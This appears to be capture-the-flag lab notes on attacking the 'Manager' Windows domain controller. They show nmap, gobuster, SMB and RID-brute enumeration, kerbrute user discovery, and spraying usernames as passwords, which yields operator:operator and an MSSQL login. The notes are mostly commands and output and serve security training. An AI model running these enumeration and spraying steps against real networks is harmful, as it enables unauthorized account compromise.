# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vvv 10.10.11.236
nmap -sU --top-ports=10 -vv 10.10.236

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-15 02:01:45Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-15T02:03:13+00:00; +19m02s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| <SNIP>
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-15T02:03:13+00:00; +19m02s from scanner time.
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-15T01:29:48
| Not valid after:  2055-04-15T01:29:48
| MD5:   8976:b481:9882:5abc:e199:9d66:998d:a5fe
| SHA-1: d860:c571:d0ea:36ad:0fcf:5fb1:972f:efd3:7e3b:e5c5
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQf0MGijD9SrlPz+I14/yN/zANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwNDE1MDEyOTQ4WhgPMjA1NTA0MTUwMTI5NDhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKNgk4n
| A4/81+LQF2C2ww+p442n5pr41YI0kHmcqcSFPFoWU0isMtOlgpeP8Dyi88nJLkYh
| 9uPoBQAOXhnHMhRS7oedFEFDPLDie15IxLH5gaY+fkuM4sQfHgxpcjAhZCPbrhYo
| HvvJJr196FdBrXeHt49K6ugpBB/N6DYklBjCVPrQUq+6/Xi9j+pGUo8YftUoizlx
| sa+QuOLNr3EoH8GdAZ+SWrWDgqlat6l3O8KWULeUctbkPK49ynow2+uHCQ4eDF+T
| 1hVxOkbqr3f2yFBmUcyEEVzgLFuplwbZJMVDpIAy34VmNJKXagKuAiiqxZJzzNwR
| zI3KxZtD2FSDFCkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAk8Va7e+23d+JC+wR
| oxrJvs2nO1b+PGmULzCPf4LxKGrluXtR0oKvtLlNGW7tMydtpgyEoWEhTVh0cUZ0
| 37oxeDEchW0aWFgXLMvxadnZxUnKpi/CJRS7PsdINq0JaIAohlJzTE7wxJLlLI8j
| YOwL4V64Lrf+EFfnQ6CqbBnUWgU21/vKSysEYEKRg/wXQKv3Pn3jkNQ2bosDlonm
| UlHCC1C7nrCCFm6KGmbJsHqVGjMdf4rUd5BEyL9CMOt8X0JQWdm3JGu95q9otcaP
| TzlGHC9zZVZOuR+bnVgLvRYPJzjIa58q8AjNSzL73OVafhpbXtg2HqGW88URz9cg
| 370GHQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-15T02:03:13+00:00; +19m02s from scanner time.
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-15T02:03:13+00:00; +19m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
<SNIP>
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-15T02:03:13+00:00; +19m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
<SNIP>
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/14%Time=67FDB9AB%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 4401/tcp): CLEAN (Timeout)
|   Check 2 (port 63091/tcp): CLEAN (Timeout)
|   Check 3 (port 12164/udp): CLEAN (Timeout)
|   Check 4 (port 44176/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 19m00s, deviation: 1s, median: 19m01s
| smb2-time: 
|   date: 2025-04-15T02:02:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127

```
	- SQL, Kerberos, HTTP, SMB, LDAP
## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://10.10.11.236 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/images               (Status: 301) [Size: 150] [--> http://10.10.11.236/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.236/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.11.236/css/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.11.236/js/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.11.236/IMAGES/]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.11.236/CSS/]
/JS                   (Status: 301) [Size: 146] [--> http://10.10.11.236/JS/]

```
		- Next Directory
			```bash
gobuster dir -u http://10.10.11.236/images dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x png

---OUTPUT---
/logo.png             (Status: 200) [Size: 2160]
/menu.png             (Status: 200) [Size: 9825]
/quote.png            (Status: 200) [Size: 447]
/next.png             (Status: 200) [Size: 177]
/location.png         (Status: 200) [Size: 601]
/Logo.png             (Status: 200) [Size: 2160]
/prev.png             (Status: 200) [Size: 183]
/call.png             (Status: 200) [Size: 1156]
/envelope.png         (Status: 200) [Size: 698]
/Next.png             (Status: 200) [Size: 177]
/Location.png         (Status: 200) [Size: 601]
/LOGO.png             (Status: 200) [Size: 2160]
/Menu.png             (Status: 200) [Size: 9825]
/Prev.png             (Status: 200) [Size: 183]
/Quote.png            (Status: 200) [Size: 447]
/search-icon.png      (Status: 200) [Size: 517]
/Call.png             (Status: 200) [Size: 1156]

```
	- VHost
		```bash
gobuster vhost
```
- Ffuf gives nothing of value (had to limit size as everything was responding OK)

- Dirsearch
	```bash
dirsearch -u
```
- Dirbuster
	- 
## SMB Enumeration
- We pass the command:
	```bash
smbclient -U '' -L 10.10.11.236

---OUTPUT---
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
	- All default shares
- We pass the same with crackmapexec, to see permissions:
	- only guest credentials worked
		- others connected but guest:guest was rejected
	```bash
crackmapexec smb 10.10.11.236 -u 'guest' -p '' --shares

---OUTPUT---
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share 
```
## Website Enumeration
- 
### Direct
- 10.10.10.236 : manager website.
	- Can send a message under Contact
	- Images lead to /image/image_name.png
- 10.10.11.236/images
	![[Pasted image 20250414215037.png]]
		- IIS Error message
## RID Bruteforce
- We canbrute force relative identifiers to enumerate possible users:
	```bash
netexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute

--OR--
impacket-lookupsid guest@10.10.11.236 -no-pass

---OUTPUT-NETEXEC---
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                         
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)                                                                                                     
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)                                                                                                    
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)                                                                                                    
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                         
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)                                                                                          
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)                                                                                               
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)

---OUTPUT-IMPACKET---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.11.236
[*] StringBinding ncacn_np:10.10.11.236[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
```
	- How does this work? (**EXPLAINED IN THE BOTTOM**)
	- We copy the data to a file ( I copied the second one as it's more clean)
		```bash
vi rid.brute # copy contents here
cat rid.brute | grep "User" | awk '{print $2}'
cat rid.brute | grep "User" | awk '{print $2}'| awk -F\\ '{print$2}'| sort -u | grep -v '\$$' # remove ending with $ as machine accounts

---OUTPUT---
MANAGER\Administrator
MANAGER\Guest
MANAGER\krbtgt
MANAGER\Domain
MANAGER\Protected
MANAGER\DC01$
MANAGER\SQLServer2005SQLBrowserUser$DC01
MANAGER\Zhong
MANAGER\Cheng
MANAGER\Ryan
MANAGER\Raven
MANAGER\JinWoo
MANAGER\ChinHae
MANAGER\Operator

---OUTPUT-2---
Administrator
Cheng
ChinHae
Domain
Guest
JinWoo
krbtgt
Operator
Protected
Raven
Ryan
SQLServer2005SQLBrowserUser$DC01
Zhong

```
		- save it to a file
			- We need the lowercase of this file too:
				```bash
cat user.txt | tr '[:upper:]' '[:lower:]'
cat user.txt | tr '[:upper:]' '[:lower:]' >>user.txt
cat user.txt

---OUTPUT-1---
administrator
cheng
chinhae
domain
guest
jinwoo
krbtgt
operator
protected
raven
ryan
sqlserver2005sqlbrowseruser$dc01
zhong

---OUTPUT-2---
Administrator
Cheng
ChinHae
Domain
Guest
JinWoo
krbtgt
Operator
Protected
Raven
Ryan
SQLServer2005SQLBrowserUser$DC01
Zhong
administrator
cheng
chinhae
domain
guest
jinwoo
krbtgt
operator
protected
raven
ryan
sqlserver2005sqlbrowseruser$dc01
zhong
```
- **ALTERNATE METHOD**
	- we could instead bruteforce with kerbrute to find users:
		```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

---OUTPUT---
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/15/25 - Ronnie Flathers @ropnop

2025/04/15 00:11:57 >  Using KDC(s):
2025/04/15 00:11:57 >   10.10.11.236:88

2025/04/15 00:11:58 >  [+] VALID USERNAME:       ryan@manager.htb
2025/04/15 00:11:59 >  [+] VALID USERNAME:       guest@manager.htb
2025/04/15 00:11:59 >  [+] VALID USERNAME:       cheng@manager.htb
2025/04/15 00:12:00 >  [+] VALID USERNAME:       raven@manager.htb
2025/04/15 00:12:08 >  [+] VALID USERNAME:       administrator@manager.htb
2025/04/15 00:12:13 >  [+] VALID USERNAME:       Ryan@manager.htb
2025/04/15 00:12:14 >  [+] VALID USERNAME:       Raven@manager.htb
2025/04/15 00:12:21 >  [+] VALID USERNAME:       operator@manager.htb

```
	- we grab the usernames from this to make a user list
		- since its all in lowercase it works better
		- However this is not the intended method 
	- How it works? **Explanation at the bottom**
- Then we bruteforce each user with its own usrname as the password (`--no-bruteforce` agument in netexec(crackmapexec))
	```bash
netexec smb 10.10.11.236 -u user.txt -p user.txt --no-bruteforce --continue-on-success       

---OUTPUT---
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Cheng:Cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ChinHae:ChinHae STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\Domain:Domain (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\JinWoo:JinWoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Operator:Operator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\Protected:Protected (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:Raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:Ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\SQLServer2005SQLBrowserUser$DC01:SQLServer2005SQLBrowserUser$DC01 (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Zhong:Zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\domain:domain (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\protected:protected (Guest)
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\sqlserver2005sqlbrowseruser$dc01:sq
```
	- `Domain:Domain`
	- `Protected:Protected`
	- `SQLServer2005SQLBrowserUser$DC01:SQLServer2005SQLBrowserUser$DC01`
	- `operator:operator`

- We test with netexec
	- We try all but operator works with mssql:
	```bash
netexec mssql 10.10.11.236 -u 'operator' -p 'operator'

---OUTPUT---
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator 
```
	- We attempt to login with these credentials:
		```bash
impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
> help

---OUTPUT---
lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
